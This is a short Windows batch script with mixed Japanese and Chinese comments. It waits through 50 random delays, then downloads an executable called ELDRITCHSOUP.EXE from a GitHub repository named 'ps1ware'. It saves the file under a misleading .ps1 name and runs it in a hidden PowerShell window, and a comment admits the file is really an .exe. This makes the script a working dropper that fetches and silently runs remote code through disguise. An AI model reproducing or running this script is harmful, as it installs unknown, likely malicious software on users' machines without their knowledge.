@echo off
setlocal enabledelayedexpansion

:: 初始化并提示
echo 実行中: 50 回のランダムスリープ (~0.15 秒) を開始します...

:: 50次带随机延迟的睡眠
for /l %%回 in (1,1,50) do (
    set /a "乱数=(%RANDOM% %% 60) + 120"
    powershell -Command "Start-Sleep -Milliseconds !乱数!"
)

echo 完成しました。ファイルをダウンロード中...

:: 正确的raw GitHub链接（直接指向EXE文件）
set "网址=https://github.com/s-b-repo/ps1ware/raw/main/ELDRITCHSOUP.EXE"

:: 输出路径
set "保存路径=%~dp0面白いスクリプト.ps1"

:: 下载文件
powershell -Command "Invoke-WebRequest -Uri '%网址%' -OutFile '%保存路径%'"

echo ダウンロード完了: %保存路径%
echo 実行中: PowerShellスクリプトを起動します...

:: 运行（它其实是个.exe）
powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%保存路径%'"

echo 完了しました。続行するにはキーを押してください。
pause
